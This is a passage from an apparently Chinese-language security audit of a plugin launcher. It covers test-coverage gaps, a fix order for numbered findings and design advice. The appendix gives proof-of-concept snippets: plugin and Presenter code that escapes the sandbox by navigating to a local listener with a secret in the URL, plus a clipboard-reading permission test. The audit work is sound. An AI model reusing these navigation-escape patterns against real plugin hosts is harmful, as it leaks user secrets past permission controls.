4. **没有权限清单热更新测试。** Rust 单测覆盖权限缓存刷新，却没有覆盖逻辑宿主自己的
   manifest lookup 副本。
5. **`cdp_page_runtime_verify` 依赖外部预置数据。** 空数据库下部分断言因只有一行记录或
   没有可展开栏目而失败；脚本应先自建固定 fixture，再断言产品行为，否则失败原因会与
   真实回归混淆。
6. **clippy 未进入常规验证。** Rust 单测和 `cargo check` 不覆盖 `absurd_extreme_comparisons` 等 lint，当前质量门无法发现 F-13。
7. **`.lupx` 回归没有覆盖 inspect 与 install 之间的源文件替换。** 正常安装、签名、覆盖关系已经覆盖，但确认卡 hash 与实际提取字节的绑定没有被断言。

## 建议处理顺序

1. **先封闭 F-01 的导航出口。** 在找到可靠的子帧导航拦截之前，不应把 `network` 权限
   当成可信隔离；带 secrets 的插件尤其需要限制。
2. **修复 F-02 的剪贴板模型预算。** 这是用户数据规模一增长就会出现的功能性故障，也会
   影响隐藏页和整体启动稳定性。
3. **修复 F-03 的逻辑宿主清单刷新。** 这是插件安装、开发模式与权限变更的基础生命周期。
4. **修复 F-04 的 `navBars` Promise / readiness 链路。** 这是导航页对外插件契约的核心入口。
5. **收口 F-05、F-06、F-07、F-08、F-09。** 这些问题组合起来会造成“页面能看见但点了没
   反应”“分离后输入丢失”“滚动提示错误”和启动阶段随机错误。
6. **继续处理 F-10 至 F-14 的防御纵深、供应链与工程治理项。** 其中 F-10 应在任何新的 raw invoke
   或宿主能力接入前处理。

## 改进意见

- **把 Page Model 改成按资源分层的模型。** 文本摘要、完整文本、缩略图、原图分别走
  `ResourceRef` / `targetId`，主模型只保留轻量索引；这比简单提高 1 MiB 上限更能保护
  Presenter、跨窗口状态和快照带宽。
- **为 host capability 建一张机器可读台账。** 每个 RPC 同时声明前端权限词、Rust command
  名、所需参数、允许窗口 label、最大载荷和负向测试脚本；由构建期脚本检查 RPC switch、
  `RPC_PERMISSION` 和 Rust `generate_handler!` 是否一一对应。
- **统一“插件身份”解析。** 逻辑 token、detached window label、main/settings native 路径
  已经有清晰规则，但仍有命令没有接入；建议把 `resolve_plugin_caller_role` 作为所有
  capability 命令的唯一入口，避免新增命令时漏 gate。
- **把导航结果 ID 与路径解耦。** 页面模型应使用短 ID + 完整 `path` 字段；所有 Presenter
  只传 ID，服务层通过 ID 查目标，减少路径长度、特殊字符和重复路径对 Intent 的影响。
- **为异步状态增加 generation / AbortController。** 前景窗口推荐行、栏目刷新、剪贴板
  search、分离窗口状态推送都存在“旧请求晚到覆盖新状态”的可能；统一使用 summon /
  page / presenter generation 可以让状态迁移可证明。
- **把 CDP 负向用例纳入常规发布门。** 至少覆盖：自导航、子帧导航、Page Model 字节预算、
  权限热更新、分离 query、长路径、空/满剪贴板和启动早期 500ms 内呼出。

## 附录：最小复现代码形态

逻辑帧自导航：

```js
export default function create() {
  setTimeout(() => {
    window.location.href =
      "http://127.0.0.1:18777/nav-escape?secret=NAVIGATION_BYPASS";
  }, 50);
  return { search: () => [] };
}
```

Presenter 自导航：

```html
<script>
  location.href =
    "http://127.0.0.1:18778/presenter-nav?secret=PRESENTER_NAVIGATION_BYPASS";
</script>
```

权限热更新样例：

```toml
id = "permission-hot"
kind = "provider"
api = 2
entry = "main.js"
# 运行中追加：
permissions = ["clipboard"]
```

```js
export default {
  async search() {
    try {
      return [{ name: `ALLOWED:${await window.lume.clipboard.readText()}`, path: "https://example.com" }];
    } catch (err) {
      return [{ name: `DENIED:${String(err)}`, path: "https://example.com" }];
    }
  },
};
```

长结果 ID 形态：

```js
{
  name: "LONG_RESULT",
  path: "https://example.com/" + "x".repeat(300),
  enter: true
}
```

以上样例只用于复现，不构成建议的插件 API 用法；修复后的负向回归应把它们放在独立
fixture 中，并断言请求数为 0、模型大小低于预算、权限调用按当前 manifest 生效。
